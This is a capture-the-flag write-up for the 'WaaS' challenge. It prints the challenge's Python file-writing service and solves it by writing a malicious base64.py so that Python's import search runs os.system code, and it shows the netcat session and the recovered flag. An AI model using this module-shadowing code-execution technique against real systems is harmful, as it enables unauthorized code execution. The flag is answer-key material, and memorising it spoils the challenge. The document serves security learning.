# WaaS

Category: MISC

Points: 491

Solves: 78

>Writing as a Service!

### Solution

```py
import subprocess
from base64 import b64decode as d
while True:
    print("[1] Write to a file\n[2] Get the flag\n[3] Exit")
    try:
        inp = int(input("Choice: ").strip())
    except:
        print("Invalid input!")
        exit(0)
    if inp == 1:
        file = input("Enter file name: ").strip()
        assert file.count('.') <= 2 # Why do you need more?
        assert "/proc" not in file # Why do you need to write there?
        assert "/bin" not in file # Why do you need to write there? 
        assert "\n" not in file # Why do you need these?
        assert "chall" not in file # Don't be overwriting my files!
        try: 
            f = open(file,'w')
        except:
            print("Error! Maybe the file does not exist?")

        f.write(input("Data: ").strip())
        f.close()
        print("Data written sucessfully!")
		
    if inp == 2:
        flag = subprocess.run(["cat","fake_flag.txt"],capture_output=True) # You actually thought I would give the flag?
        print(flag.stdout.strip())
```

Looks like we can:
1. supply a filename and data to write into that file.
2. run `cat fake_flag.txt`

Unfortunately, our file name can't contain more than 2 `.`, `/proc`, `/bin`, `\n`, or `chall` (The challenge file is `chall.py`).

What's suspicious about this is that there is a random `base64` import in the file that seemingly does nothing. That's when I remembered that in python, when you `import *name*` it will first check your local directory for a `name.py` file, if it doesn't exist then it will look for pip and builtin libraries. This means that we can abuse this import by creating our own `base64.py` (or `subprocess.py`) file, and getting that to print our flag.

```bash
$ nc challs.n00bzunit3d.xyz 10447
[1] Write to a file
[2] Get the flag
[3] Exit
Choice: 1
Enter file name: base64.py
Data: import os;os.system("cat flag.txt") # first used ls to find flag.txt
Data written sucessfully!
[1] Write to a file
[2] Get the flag
[3] Exit
Choice: ^C
$ nc challs.n00bzunit3d.xyz 10447
n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!_23871b2de61e}
```

### Flag

```n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!_23871b2de61e}```